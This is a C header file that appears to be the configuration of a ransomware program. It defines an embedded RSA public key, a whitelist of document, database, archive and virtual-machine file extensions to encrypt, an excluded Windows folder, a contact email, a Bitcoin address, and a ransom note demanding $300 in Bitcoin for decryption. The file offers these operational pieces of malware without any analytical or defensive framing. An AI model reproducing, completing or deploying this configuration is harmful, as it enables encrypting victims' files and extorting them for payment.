#ifndef __CONFIG_H__
#define __CONFIG_H__

#define MASTER_RSA_PUB L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL" \
                       "hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w" \
                       "VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E" \
                       "ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"

#define FILE_EXT_WHITE L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb" \
                       L".gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln"  \
                       L".sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip."
                       
#define FOLDER_BLCKLST L"C:\\Windows;"

//
#define RANSOM_NOTE_EML1 L"wowsmith123456@posteo.net"

#define BITCOIN_ADDRESS1 L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX"

#define RANSOM_NOTE_NAME L"README.TXT"

#define RANSOM_NOTE_TXT1 L"Ooops, your important files are encrypted.\r\n" \
						 L"\r\n" \
						 L"If you see this text, then your files are no longer accessible, because\r\n" \
						 L"they have been encrypted. Perhaps you are busy looking for a way to recover\r\n" \
						 L"your files, but don't waste your time. Nobody can recover your files without\r\n" \
						 L"our decryption service.\r\n" \
						 L"\r\n" \
						 L"We guarantee that you can recover all your files safely and easily.\r\n" \
						 L"All you need to do is submit the payment and purchase the decryption key.\r\n" \
						 L"\r\n" \
						 L"Please follow the instructions:\r\n" \
						 L"\r\n" \
						 L"1.\tSend $300 worth of Bitcoin to following address:\r\n" \
						 L"\r\n"
						 
#define RANSOM_NOTE_TXT2 L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail "

#define RANSOM_NOTE_TXT3 L"\tYour personal installation key:\r\n\r\n"

#define MAX_BLOCK_NCRYPT 0x100000

#define TIME_WAIT_DEFAULT 1;

#endif